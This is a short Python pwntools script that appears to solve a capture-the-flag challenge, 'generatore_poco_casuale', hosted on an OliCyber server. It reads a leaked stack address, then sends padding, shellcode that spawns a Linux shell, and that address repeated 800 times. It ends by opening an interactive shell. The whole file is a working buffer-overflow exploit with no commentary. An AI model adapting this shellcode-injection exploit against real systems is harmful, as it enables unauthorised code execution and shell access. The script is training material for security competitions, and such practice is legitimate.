from pwn import *

if args.REMOTE:
    r = remote("gpc.challs.olicyber.it", 10104)
else:
    r = gdb.debug('./generatore_poco_casuale', '''
                        b *randomGenerator+149  
                        c
                  ''')

r.recvuntil(b'Ecco il numero casuale: ')
leak = int(r.recvline().strip().decode()) + 6
print(f"shellcode_address: {hex(leak)}")

r.recvuntil(b'Desideri continuare? (s/n)')

payload = b's' + b'\x00'*7 + asm(shellcraft.amd64.linux.sh(), arch='x86_64')
payload += p64(leak)*800
r.sendline(payload)
r.interactive()